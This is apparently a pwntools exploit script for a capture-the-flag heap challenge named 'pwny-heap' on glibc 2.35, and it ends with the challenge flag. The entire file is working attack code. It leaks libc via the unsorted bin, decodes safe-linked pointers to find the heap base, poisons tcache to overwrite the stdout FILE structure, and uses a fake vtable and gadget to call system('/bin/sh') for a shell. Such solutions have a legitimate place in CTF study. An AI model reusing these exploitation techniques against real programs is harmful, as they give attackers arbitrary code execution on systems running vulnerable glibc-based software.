from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug("./pwny-heap", gdbscript='''
    continue
''')

def malloc(index, size):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"index: ", b"%d" % index)
    p.sendlineafter(b"size: ", b"%d" % size)

def free(index):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"index: ", b"%d" % index)

def view(index):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"index: ", b"%d" % index)
    p.recvuntil(b": ")
    raw = p.recvuntil(b"1. ")[:-3]
    return raw

def write(index, data):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"index: ", b"%d" % index)
    p.sendlineafter(b"write something in: ", b"%s" % data)

##### LEAKING LIBC #####
# fastbin attack; fill the tcache with 7 chunks and let the 8th chunk be in the unsorted bin
for i in range(9):
    malloc(i, 0xf8)
for i in range(8):
    free(i)
raw_libc_leak = view(7)
libc_leak = u64(raw_libc_leak+b"\x00"*(8-len(raw_libc_leak)))
libc = ELF("./libc-2.35.so")
libc.address = libc_leak-(0x7fe115c1ace0-0x7fe115a00000)
log.info("LIBC @ %s" % hex(libc.address))

##### LEAKING HEAP #####
# normal decrypt safe-linking
raw_heap_base = view(0)
heap_base = u64(raw_heap_base+b"\x00"*(8-len(raw_heap_base)))*0x1000
log.info("HEAP @ %s" % hex(heap_base))

##### GETTING SHELL #####
# FSOP; attack the File Structure in the stdout to pop a shell
malloc(10, 0xf8) # this will go in ID 6
free(6)
b = heap_base+0x8a0
target = libc.symbols['_IO_2_1_stdout_']
towrite = target^(b>>12)
write(10, p64(towrite))
malloc(11, 0xf8)
malloc(12, 0xf8)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
gadget = next(libc.search(asm('add rdi, 0x10 ; jmp rcx')))
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']  
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')
fake._lock=stdout+0x8*7
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
write(12, fake)

p.interactive()

# MVM{pwnpope_is_mining_xmr_on_your_machine_for_the_vatican}
